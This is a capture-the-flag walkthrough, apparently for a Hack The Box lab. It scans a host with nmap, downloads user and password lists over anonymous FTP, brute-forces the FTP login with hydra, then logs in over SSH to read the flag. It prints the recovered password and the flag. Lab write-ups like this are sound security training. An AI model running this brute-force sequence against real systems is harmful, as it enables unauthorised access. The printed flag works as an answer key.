# FTP

### What port is the FTP service running on?

```bash
nmap -sV 10.129.203.6
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain      ISC BIND 9.16.1 (Ubuntu Linux)
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
2121/tcp open  ftp
```

2121

### What username is available for the FTP server?

```bash
ftp 10.129.203.6 2121
Name (10.129.203.6:kali): anonymous
get passwords.list
get users.list
```

now we got wordlists, lets brute force it with hydra

```bash
hydra -L users.list -P passwords.list ftp://10.129.203.6:2121 -t 64 
[2121][ftp] host: 10.129.203.6   login: robin   password: 7iz4rnckjsduza7
```

robin

### Use the discovered username with its password to login via SSH and obtain the flag.txt file. Submit the contents as your answer.

```bash
ssh robin@10.129.203.6    
cat flag.txt
HTB{ATT4CK1NG_F7P_53RV1C3}
```
